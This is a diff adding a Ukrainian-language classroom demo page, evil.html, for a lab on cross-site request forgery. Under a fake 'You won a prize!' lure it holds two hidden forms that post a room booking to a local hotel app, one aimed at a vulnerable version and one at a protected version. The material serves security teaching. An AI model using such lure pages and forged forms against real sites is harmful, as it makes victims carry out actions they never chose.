@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <title>Навчальна демонстрація CSRF</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 640px; margin: 40px auto; padding: 0 16px; color: #4a2635; }
+        button { font: inherit; padding: 10px 18px; margin: 6px 6px 6px 0; cursor: pointer; }
+    </style>
+</head>
+<body>
+<h1>«Ви виграли приз!»</h1>
+<p>Сторінка імітує сторонній сайт для практичної №8. Відкрийте її з іншого origin:
+    <code>php -S localhost:9000</code> у цій папці, потім <code>http://localhost:9000/evil.html</code>.</p>
+
+<form id="attack-before" method="post">
+    <input type="hidden" name="action" value="book">
+    <input type="hidden" name="room_id" value="1">
+    <input type="hidden" name="guest_name" value="CSRF-атака">
+    <input type="hidden" name="date_from" value="2027-02-10">
+    <input type="hidden" name="date_to" value="2027-02-12">
+    <button type="submit">Забрати приз (атака на вразливу версію)</button>
+</form>
+
+<form id="attack-after" method="post">
+    <input type="hidden" name="action" value="book">
+    <input type="hidden" name="room_id" value="1">
+    <input type="hidden" name="guest_name" value="CSRF-атака">
+    <input type="hidden" name="date_from" value="2027-02-10">
+    <input type="hidden" name="date_to" value="2027-02-12">
+    <button type="submit">Забрати приз (атака на захищену версію)</button>
+</form>
+
+<script>
+    const APP_URL = 'http://localhost:8000';
+    document.getElementById('attack-before').action = APP_URL + '/before/index.php';
+    document.getElementById('attack-after').action = APP_URL + '/after/index.php';
+</script>
+</body>
+</html>
